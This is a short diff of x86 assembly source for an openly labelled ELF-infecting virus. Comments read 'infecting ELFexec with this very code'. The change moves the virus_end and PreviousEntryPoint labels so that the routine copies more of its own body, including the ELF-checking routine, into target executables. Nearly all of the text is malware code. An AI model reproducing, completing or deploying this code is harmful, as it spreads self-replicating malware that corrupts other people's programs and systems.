@@ -91,8 +91,8 @@ _start:
 		mov dword [ebp-8], eax
 
 	;infecting ELFexec with this very code
-	    mov ecx, code_end       ; copy code_end address
-	    sub ecx, _start       ; copy code_end address
+	    mov ecx, virus_end       ; copy virus_end address
+	    sub ecx, _start       ; copy virus_end address
 
 	    write dword [ebp-4], _start, ecx
 
@@ -146,10 +146,6 @@ next_i:
 	pop ecx
 	ret
 
-PreviousEntryPoint: dd VirusExit
-virus_end:
-
-
 real_checkELF:
 	push ebp
 	mov ebp, esp
@@ -183,4 +179,5 @@ real_checkELF:
 
 	ret
 
-code_end:
+PreviousEntryPoint: dd VirusExit
+virus_end:
